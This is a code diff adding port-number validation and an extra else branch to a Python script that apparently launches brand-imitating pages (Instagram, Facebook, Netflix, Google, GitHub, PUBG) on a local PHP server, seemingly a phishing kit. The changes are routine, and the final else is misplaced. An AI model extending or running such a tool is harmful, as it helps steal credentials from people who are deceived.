@@ -127,11 +127,18 @@ def instagram():
 
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        if port > 65535:
+            exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+
+
     except KeyboardInterrupt:
         exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
-
+    except ValueError:
+        exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 #====================================================================================================
     php_server()
     
@@ -238,11 +245,18 @@ def facebook():
     os.chdir(rf"{path}/facebook")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        if port > 65535:
+            exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+            
+
     except KeyboardInterrupt:
         exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
-
+    except ValueError:
+            exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 #====================================================================================================
     php_server()
 
@@ -344,11 +358,18 @@ def netflix():
     os.chdir(rf"{path}/Netflix")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        if port > 65535:
+            exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+            
+
     except KeyboardInterrupt:
         exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
-
+    except ValueError:
+            exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 
 #====================================================================================================
     php_server()
@@ -452,11 +473,18 @@ def Google():
     os.chdir(rf"{path}/Google")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        if port > 65535:
+            exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+            
+
     except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
-
+    except ValueError:
+            exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 #====================================================================================================
     php_server()
 
@@ -558,11 +586,18 @@ def Github():
     os.chdir(rf"{path}/Github")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        if port > 65535:
+            exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+            
+
     except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
-
+    except ValueError:
+            exit(f"""{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 #====================================================================================================
     php_server()
 
@@ -666,11 +701,18 @@ def Pubg():
     os.chdir(rf"{path}/Pubg")
 #====================================================================================================
     try:
-        port = input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET)
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open (Default 80) {Fore.GREEN}⮞ " + Fore.RESET))
+        if port > 65535:
+            exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+            
+
     except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
-    
+    except ValueError:
+        exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 #====================================================================================================
     php_server()
 
@@ -794,3 +836,7 @@ if ask == "5" or ask == "05":
 
 if ask == "6" or ask == "06":
     Pubg()
+
+else:
+    exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.BLUE}[-]{Fore.RED} No Such Option !""")
